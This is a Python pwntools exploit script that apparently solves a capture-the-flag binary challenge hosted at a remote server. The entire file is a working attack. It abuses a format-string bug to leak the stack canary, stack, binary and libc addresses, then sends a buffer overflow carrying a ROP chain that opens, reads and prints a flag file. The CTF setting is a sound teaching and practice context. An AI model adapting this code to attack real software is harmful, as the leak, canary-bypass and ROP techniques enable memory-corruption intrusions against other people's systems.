#!/usr/bin/env python3

from pwn import *

exe = ELF("./task")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

r = None

def conn():
    global r
    if args.LOCAL:
        print(exe.path)
        print(ld.path)
        print(libc)
        #if patched binary does not work - exe is original one
        r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 33744)

def exec_fmt(payload):
    r.sendline(payload)
    return r.recvuntil(b'\nmessage: ')[:-10]

def leak_addr(off):
    r.sendline(f"%{off}$p".encode())
    resp = r.recvuntil(b'\nmessage: ')[:-10]
    return int(resp, base=16)

def write_fmt(autofmt, rops, stack_addr):
    for rop in rops:
        print(rop)
        autofmt.write(stack_addr, rop)
        autofmt.execute_writes()
        stack_addr += 0x8

#ROP GADGETS

syscall_ret = 0x0013ff57
pop_rax = 0x00166334
pop_rdi = 0x0019b5f7    
pop_rsi = 0x001997ff
pop_rdx = 0x001cd702

mov_edi_prdx = 0x001ab706
mov_prdx_rax = 0x0008fac7

TMP_PLACE = 0x202F00

libc_base = 0

def l(addr):
    return libc_base + addr

def open_rop(flag_addr):
    rops = [
        p64(l(pop_rax)),
        p64(2),
        p64(l(pop_rdi)),
        p64(flag_addr),
        p64(l(pop_rsi)),
        p64(0),
        p64(l(pop_rdx)),
        p64(0),
        p64(l(syscall_ret))
    ]

    return rops


def read_rop(buff_addr):
    rops = [
        p64(l(pop_rax)),
        p64(0),
        p64(l(pop_rsi)),
        p64(buff_addr),
        p64(l(pop_rdx)),
        p64(0x30),
        p64(l(syscall_ret))
    ]

    return rops


def move_rax(addr):
    rops = [
        p64(l(pop_rdx)),
        p64(addr),
        p64(l(mov_prdx_rax)),
        p64(l(mov_edi_prdx))    
    ]

    return rops

def leak_flag(buff_addr, puts_addr):
    rops = [
        p64(l(pop_rdi)),
        p64(buff_addr),
        p64(puts_addr)
    ]
    return rops

def main():
    conn()
    r.recvuntil(b'message: ')
    
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    #print(f"Offset is {offset}")
    cookie_offset = offset + 9
    rbp_offset = offset + 10
    ret_offset = offset + 11
    libc_offset = offset + 13

    stack_cookie = leak_addr(cookie_offset)
    stack_ret_addr = leak_addr(rbp_offset) - 0x8
    binary_base = leak_addr(ret_offset) - 0xc63
    global libc_base
    libc_base = leak_addr(libc_offset) - 0x21c87

    puts_offset = 0x80970

    print(f"Leak stack cookie {hex(stack_cookie)}")
    print(f"Leak stack ret addr @ {hex(stack_ret_addr)}")
    print(f"Leak binary base @ {hex(binary_base)}")
    print(f"Leak libc base @ {hex(libc_base)}")

    rops = []

    tmp_addr = TMP_PLACE + binary_base

    print(f"Writing to {hex(tmp_addr)} ...")  
    autofmt.write(tmp_addr, b"/flag.tx")
    autofmt.write(tmp_addr + 0x8, b"t\x00")
    autofmt.execute_writes()

    rops += open_rop(tmp_addr)
    rops += move_rax(tmp_addr + 0x10)
    rops += read_rop(tmp_addr + 0x10)

    rops += leak_flag(tmp_addr + 0x10, libc_base + puts_offset)
    
    #write_fmt(autofmt, rops, stack_ret_addr)
    #autofmt.write(stack_ret_addr - 0x10, stack_cookie)

    payload = 0x48 * b"A" + p64(stack_cookie) + b"BBBBBBBB"

    for addr in rops:
        payload += addr

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
